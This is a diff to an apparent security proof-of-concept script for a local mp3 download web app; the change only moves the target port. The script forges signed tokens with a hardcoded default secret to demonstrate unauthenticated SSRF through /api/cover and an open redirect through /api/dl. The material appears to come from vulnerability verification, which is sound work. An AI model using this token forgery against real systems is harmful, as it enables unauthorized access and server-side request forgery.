@@ -3,7 +3,7 @@ import base64, hashlib, hmac, json, os, sqlite3, sys, time
 
 import requests
 
-BASE = "http://127.0.0.1:8080"
+BASE = "http://127.0.0.1:9080"
 DB = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "storage", "mp3dl.db")
 
 
@@ -20,7 +20,7 @@ def forge(url, secret="mp3dl-dev-secret-change-me"):
 
 print("=" * 70)
 print("[1] 未登录访问 /api/cover 伪造 token（默认密钥）-> SSRF")
-token = forge("http://127.0.0.1:8080/api/platforms")
+token = forge("http://127.0.0.1:9080/api/platforms")
 r = requests.get(f"{BASE}/api/cover/{token}", timeout=15)
 print("    HTTP", r.status_code, "| content-type:", r.headers.get("content-type"),
       "| 长度:", len(r.content))
@@ -28,7 +28,7 @@ print("    回显前 120 字节:", r.content[:120])
 
 print("=" * 70)
 print("[2] 未登录访问 /api/dl 伪造 token -> 开放重定向")
-token2 = forge("http://127.0.0.1:8080/admin")
+token2 = forge("http://127.0.0.1:9080/admin")
 r2 = requests.get(f"{BASE}/api/dl/{token2}", allow_redirects=False, timeout=10)
 print("    HTTP", r2.status_code, "| 未登录应 401，实际:", r2.status_code,
       "| Location:", r2.headers.get("Location"))
